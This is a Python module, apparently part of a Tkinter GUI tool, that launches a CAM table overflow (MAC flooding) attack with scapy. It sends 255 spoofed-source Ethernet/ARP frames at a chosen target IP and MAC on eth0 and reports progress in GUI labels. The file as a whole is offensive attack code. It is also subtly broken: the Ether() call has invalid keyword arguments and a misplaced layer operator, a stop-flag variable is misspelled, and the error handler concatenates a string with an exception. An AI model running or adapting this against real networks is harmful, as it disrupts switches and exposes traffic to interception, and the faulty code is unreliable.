import threading
import traceback

from scapy.all import *
from scapy.layers.l2 import Ether, ARP, sendp

from tkinter import *

def startCam(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, targetMac, colorConfig = "#252525") :

    global camIsRunning, camThreads, terminalLabel, wiresharkLabel, errorOutputLabel

    camIsRunning = False
    camThreads = threading.Thread(target = lambda : generate_packets(targetIp, targetMac))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    wiresharkLabel.configure(bg = colorConfig)
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Target IP = " + targetIp + "\n"
    terminalLabel["text"] += "$ Target MAC = " + targetMac + "\n"
    terminalLabel["text"] += "$ Running CAM Overflow Attack...\n"

    print("\nTarget IP = " + targetIp + " and Target MAC = " + targetMac + "\n")

    runCamAttack(targetIp, targetMac)
    
    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopCam() :
    global camThreads, camIsRunning
    try:
        terminalLabel["text"] += "$ Stopping CAM Table Attack...\n"
        camIsrunning = False
        camThreads.join(0)
        camThreads = None
        terminalLabel["text"] += "$ CAM Table Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runCamAttack(targetIp, targetMac) :
    global camThreads, camIsRunning
    camIsRunning = True
    camThreads.start()

def generate_packets(targetIp, targetMac) :
    packet_list = []
    fake_macs = ["00:AA:BB:CC:DD:{:02x}".format(i) for i in range(1, 256)]
    
    for mac in fake_macs :
        packet = Ether(source=mac, destination=targetMac/ ARP(op=2, pdst=targetIp))
        packet_list.append(packet)
    
    cam_overflow(packet_list)

def cam_overflow(packet_list) :
    sendp(packet_list, iface="eth0")
    stopCam()